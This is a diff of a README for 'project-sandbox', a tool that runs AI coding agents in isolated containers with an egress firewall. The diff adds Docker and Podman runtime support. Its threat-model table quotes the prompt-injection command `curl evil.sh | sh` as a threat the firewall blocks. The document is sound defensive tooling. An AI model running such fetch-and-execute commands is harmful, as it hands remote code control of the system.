@@ -1,6 +1,6 @@
 # project-sandbox
 
-`project-sandbox` runs Claude Code, Codex CLI, OpenCode, or a plain Bash shell inside per-project Linux containers managed by Apple's [`container`](https://github.com/apple/container) runtime. Each container runs in its own VM with hardware-enforced isolation, so the box itself is the security boundary — the agents are configured to operate freely inside it.
+`project-sandbox` runs Claude Code, Codex CLI, OpenCode, or a plain Bash shell inside per-project Linux containers. On macOS, direct CLI runs default to Apple's [`container`](https://github.com/apple/container) runtime, where each container runs in its own VM. On Linux, direct CLI runs support Docker or Podman. The agents are configured to operate freely inside the selected runtime boundary.
 
 The tool generates a derived image with OpenSpec and detected agent CLIs, sanitized agent configs, an egress firewall, and a parallel devcontainer specification so the same sandbox is reachable from the Python CLI or from local devcontainer clients.
 
@@ -12,13 +12,14 @@ Given `project-sandbox /path/to/repo python:3.12-slim`:
 2. Render `<project>/.project-sandbox/` — `Dockerfile`, `entrypoint.sh`, `init-firewall.sh`, sanitized `claude/settings.json` and `codex/config.toml`, and a devcontainer post-start init script. Agent credentials are staged separately under `/tmp` with private directory permissions to reduce the chance of accidentally committing them.
 3. Render `<project>/.devcontainer/` with symlinks back into `.project-sandbox/` so the Dockerfile and firewall script remain a single source of truth.
 4. Detect available host agent configs (`~/.claude`, `~/.codex`, `~/.config/opencode`) and install only those agent CLIs into the generated Dockerfile. OpenSpec and Bash are always available.
-5. Append `.project-sandbox/` to `<project>/.gitignore` (idempotent).
+5. Append `.project-sandbox/` and `.devcontainer/` to `<project>/.gitignore` (idempotent).
 
 Given `project-sandbox --agent claude /path/to/repo python:3.12-slim`, it additionally:
 
-1. Verify the `container` system service is running.
-2. Build the image with `container build`.
-3. The container entrypoint wires Git and jj identity, copies staged credentials into the container's home, then runs the firewall before exec'ing the agent.
+1. Select a direct-run runtime: Apple `container` on macOS, or Docker/Podman on Linux.
+2. Verify the Apple `container` system service is running when that runtime is selected.
+3. Build the image with the selected runtime.
+4. The container entrypoint wires Git and jj identity, copies staged credentials into the container's home, then runs the firewall before exec'ing the agent.
 
 ## Install
 
@@ -61,14 +62,22 @@ Use `--dry-run` to preview every action without writing files or starting the ru
 uv run project-sandbox --dry-run /absolute/path/to/repo python:3.12-slim
 ```
 
+Direct CLI runs use `--runtime auto` by default. Auto-selection prefers Apple `container` on macOS, and Docker then Podman on Linux. Override it when needed:
+
+```bash
+uv run project-sandbox --runtime docker --agent bash /absolute/path/to/repo python:3.12-slim
+uv run project-sandbox --runtime podman --agent bash /absolute/path/to/repo python:3.12-slim
+uv run project-sandbox --runtime apple-container --agent bash /absolute/path/to/repo python:3.12-slim
+```
+
 ## File layout
 
 ```
 <project>/
-├── .gitignore                       # appended (idempotent): .project-sandbox/
+├── .gitignore                       # appended (idempotent): .project-sandbox/ and .devcontainer/
 ├── .project-sandbox/
 │   ├── .gitignore                       # local safeguard; parent .gitignore ignores the whole directory
-│   ├── Dockerfile                       # generated (Apple container CLI runs)
+│   ├── Dockerfile                       # generated (direct CLI runs)
 │   ├── Dockerfile.devcontainer          # generated (devcontainer build)
 │   ├── entrypoint.sh                    # container PID 1
 │   ├── init-firewall.sh                 # iptables/ipset egress allowlist (CLI variant)
@@ -89,7 +98,7 @@ uv run project-sandbox --dry-run /absolute/path/to/repo python:3.12-slim
     └── codex-devcontainer      → ../.project-sandbox/codex-devcontainer
 ```
 
-The `.project-sandbox/` directory is generated local state and is ignored as a whole. Re-run `project-sandbox` after cloning, pulling generated config changes, or refreshing credentials. Agent credential staging lives outside the project under `/tmp/project-sandbox-<uid>/...`.
+The `.project-sandbox/` and `.devcontainer/` directories are generated local state and are ignored as a whole. Re-run `project-sandbox` after cloning, pulling generated config changes, or refreshing credentials. Agent credential staging lives outside the project under `/tmp/project-sandbox-<uid>/...`.
 
 ## Devcontainer flow
 
@@ -103,7 +112,7 @@ Generate the devcontainer without building or running anything:
 uv run project-sandbox /absolute/path/to/repo python:3.12-slim
 ```
 
-This is useful for repos whose owners do not have `apple/container` installed but want the sandboxed agent environment in a local devcontainer-capable IDE. Remote devcontainer services such as Codespaces need additional adaptation because the generated spec uses local `.project-sandbox/` files, absolute host credential staging under `/tmp/project-sandbox-<uid>/...`, and firewall capabilities (`NET_ADMIN`/`NET_RAW`) that may not be available remotely.
+This is useful for repos whose owners do not want to run a direct CLI runtime but want the sandboxed agent environment in a local devcontainer-capable IDE. Remote devcontainer services such as Codespaces need additional adaptation because the generated spec uses local `.project-sandbox/` files, absolute host credential staging under `/tmp/project-sandbox-<uid>/...`, and firewall capabilities (`NET_ADMIN`/`NET_RAW`) that may not be available remotely.
 
 ## Unsupervised (fire-and-forget) sessions
 
@@ -121,8 +130,9 @@ uv run project-sandbox \
 - `--agent {claude,codex,opencode,bash}` selects which agent to run. If omitted, the CLI only initializes generated config files unless a prompt is supplied. Claude, Codex, and OpenCode require their host config directories; Bash is always available.
 - `--log FILE` overrides the default log path under `.project-sandbox/sessions/<agent>-main-<timestamp>.log`.
 - For headless `claude` runs, a readable markdown transcript is rendered automatically beside the log (same name, `.md` extension) by parsing the stream-json events. This is best-effort: a parse failure prints a warning but never fails the run.
-- `--timeout SECONDS` stops the session if the agent runs too long: the `container run` process group is terminated (SIGTERM, then SIGKILL), which tears down the `--rm` container, and the CLI returns exit code `124`.
-- `--verbose` controls how much is shown on the terminal. By default it is quiet: image build and `container system start` output is suppressed (shown only if they fail), the in-container firewall banner is silenced, interactive runs just print `Starting container…` before handing off to the agent/shell, and headless runs print the log path up front and a `Wrote N lines to …` summary at the end (the full output still goes to the log file). With `--verbose`, the build output streams, the firewall banner shows, and headless output is teed live to the terminal as well as the log.
+- `--runtime {auto,apple-container,docker,podman}` selects the direct-run backend. `auto` prefers Apple `container` on macOS and Docker then Podman on Linux.
+- `--timeout SECONDS` stops the session if the agent runs too long: the runtime process group is terminated (SIGTERM, then SIGKILL), which tears down the `--rm` container, and the CLI returns exit code `124`.
+- `--verbose` controls how much is shown on the terminal. By default it is quiet: image build and Apple `container system start` output is suppressed (shown only if they fail), the in-container firewall banner is silenced, interactive runs just print `Starting container…` before handing off to the agent/shell, and headless runs print the log path up front and a `Wrote N lines to …` summary at the end (the full output still goes to the log file). With `--verbose`, the build output streams, the firewall banner shows, and headless output is teed live to the terminal as well as the log.
 - The agent's exit code is propagated, so CI pipelines can detect failures.
 
 Unsupervised sessions skip the interactive `-it` flags and switch dispatch to `<agent>-headless` for all supported agents. Claude runs with `--dangerously-skip-permissions`, Codex uses `approval_policy = "never"`, OpenCode runs via `opencode run`, and Bash runs with `bash -lc`. The container is still the sandbox boundary; review the diff before integrating.
@@ -136,7 +146,7 @@ When the firewall is enabled (default), `init-firewall.sh` runs as root inside t
 - Sets `iptables` and `ip6tables` policies to DROP.
 - Pins DNS to the first resolver listed in `/etc/resolv.conf` (closes the DNS-tunnel exfiltration gap in the upstream Anthropic devcontainer).
 - Allows GitHub's published IP ranges (fetched from `api.github.com/meta`), `registry.npmjs.org`, Claude/Anthropic endpoints (`api.anthropic.com`, `claude.ai`, `code.claude.com`, `platform.claude.com`), `api.openai.com`, `auth.openai.com`, and `chatgpt.com`.
-- In the devcontainer firewall variant only, allows the host gateway subnet so port-forwarding and IDE attach work. Direct Apple `container` CLI runs do not need host-network access and omit it.
+- In the devcontainer firewall variant only, allows the host gateway subnet so port-forwarding and IDE attach work. Direct CLI runs omit this host-network allowlist.
 - Mirrors the IPv4 allowlist into a parallel IPv6 set; falls back to disabling IPv6 via `sysctl` when `ip6_tables` is unavailable — the script exits with an error if both `ip6tables` and `sysctl` are unavailable.
 
 Customize:
@@ -148,12 +158,12 @@ Customize:
 
 | Threat | Mitigation |
 |---|---|
-| Agent reads `~/.ssh`, `~/Library`, etc. | VM boundary (`apple/container` `Virtualization.framework`); arbitrary host home directories are not mounted by default. |
-| Agent deletes the wrong project directory | The workspace, generated config, staged agent credentials, optional `--mount` entries, and worktree-mode `.git` metadata are the intentional host mounts; everything else lives in the disposable VM. |
+| Agent reads `~/.ssh`, `~/Library`, etc. | Arbitrary host home directories are not mounted by default. Apple `container` adds a VM boundary; Docker/Podman rely on the host's container isolation. |
+| Agent deletes the wrong project directory | The workspace, generated config, staged agent credentials, optional `--mount` entries, and worktree-mode `.git` metadata are the intentional host mounts; everything else lives in the disposable container or VM. |
 | Agent exfiltrates the workspace to an arbitrary server | iptables egress allowlist (default DROP + domain whitelist) for both IPv4 and IPv6. |
-| DNS tunneling exfiltration | DNS restricted to the in-VM resolver only. |
+| DNS tunneling exfiltration | DNS restricted to the container resolver only. |
 | Prompt injection drives `curl evil.sh \| sh` | Blocked unless the C2 host is on the allowlist. |
-| Malicious npm post-install scripts | Run as UID 1000 inside the VM; no host access. |
+| Malicious npm post-install scripts | Run as UID 1000 inside the container; no access to unmounted host paths. |
 | Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` (Claude) and `disable_update_check = true` (Codex). |
 | Agent sends telemetry / usage data | `CLAUDE_TELEMETRY_DISABLED=1` (Claude); `analytics.enabled = false` and `feedback.enabled = false` (Codex). |
 | API token leakage via process environment | Tokens are passed through mounted credential files, not environment variables; host staging files are kept under a private `/tmp` directory. |
@@ -166,17 +176,20 @@ The tool does **not** protect against:
 
 ## Troubleshooting
 
-- **`container system start` failed.** Make sure macOS 15+ is current and `apple/container` is installed; the tool calls `container system start` idempotently before building.
-- **Build OOM.** The builder VM is separate from run VMs. Bump it: `container builder start --memory 8g --cpus 8`, then re-run `project-sandbox`.
+- **No supported runtime found.** Install Apple `container` on macOS, or Docker/Podman on Linux. You can also pass `--runtime docker`, `--runtime podman`, or `--runtime apple-container` explicitly.
+- **`container system start` failed.** Make sure macOS 15+ is current and `apple/container` is installed; the tool calls `container system start` idempotently before building when the Apple runtime is selected.
+- **Build OOM on Apple `container`.** The builder VM is separate from run VMs. Bump it: `container builder start --memory 8g --cpus 8`, then re-run `project-sandbox`.
 - **GitHub meta API timeout.** The firewall script falls back to an empty `{web,api,git,ipv6}` set and starts with a partial allowlist. Re-running the agent later (with the firewall flushed and rebuilt at container start) will retry.
 - **`ip6tables` unavailable.** The script attempts `sysctl net.ipv6.conf.all.disable_ipv6=1` first. If that also fails, the script aborts with an error.
 - **Credentials look stale.** Re-run `project-sandbox` on the host to refresh the `/tmp` credential staging directory from the host agent config or macOS Keychain.
 - **Env vars in `vminitd.log`.** apple/container [logs the full process environment](https://github.com/apple/container/discussions/1153). Tokens are passed through mounted credential files only; identity env vars are low-sensitivity.
+- **Rootless Podman firewall setup fails.** The default firewall needs `NET_ADMIN` and `NET_RAW`. Use a Podman setup that permits those capabilities, or pass `--no-firewall` only for trusted-network debugging.
 
 ## Limitations
 
 - Base images, including the final stage of a Dockerfile passed with `--dockerfile`, must be Debian or Ubuntu based — the firewall depends on `apt` packages including `aggregate`, which Alpine does not ship.
-- Apple `container` is required for direct Python CLI runs. The generated `.devcontainer/` targets local Docker-compatible runtimes such as Docker Desktop or OrbStack; remote services may require rewriting local mounts and relaxing or replacing firewall capability requirements.
+- Direct Python CLI runs support Apple `container`, Docker, and Podman. Docker/Podman provide container isolation rather than the Apple MicroVM boundary. Incus is a future backend candidate, but it has a different image/import and launch lifecycle from the generated Dockerfile flow used here.
+- The generated `.devcontainer/` targets local Docker-compatible runtimes such as Docker Desktop or OrbStack; remote services may require rewriting local mounts and relaxing or replacing firewall capability requirements.
 - `--branch` (worktree mode) creates a git worktree on the given branch (creating it if it doesn't exist), mounts the worktree at `/workspace`, and bind-mounts the main repo's `.git/` so `git` works correctly inside the container. After the session, `--after-session` controls whether to merge, rebase, open a PR, or do nothing. Note: jj repos and worktree-of-worktree setups are not yet supported.
 - `jj` is installed in the container and configured with the same global name/email identity passed to Git, but jj-native repos are not yet supported by `--branch`.
 
@@ -188,13 +201,13 @@ uv run python -m compileall src tests
 uv run pytest -q
 ```
 
-Tests cover CLI surface, dry-run non-mutation, renderer output, container `argv` construction, devcontainer JSON validity and symlinks, gitignore helpers, and Python-native unsupervised-session timeout handling.
+Tests cover CLI surface, runtime selection, dry-run non-mutation, renderer output, container `argv` construction, devcontainer JSON validity and symlinks, gitignore helpers, and Python-native unsupervised-session timeout handling.
 
 A self-contained end-to-end smoke test creates a throwaway hello-world project, runs the tool against it, and validates every generated artefact:
 
 ```bash
 ./scripts/e2e-test.sh                  # portable: devcontainer only path
-./scripts/e2e-test.sh --with-container # also exercises direct CLI container runs (requires apple/container)
+./scripts/e2e-test.sh --with-container # also exercises direct CLI container runs
 ```
 
 The test prints the temp project path on success so the generated files can be inspected.
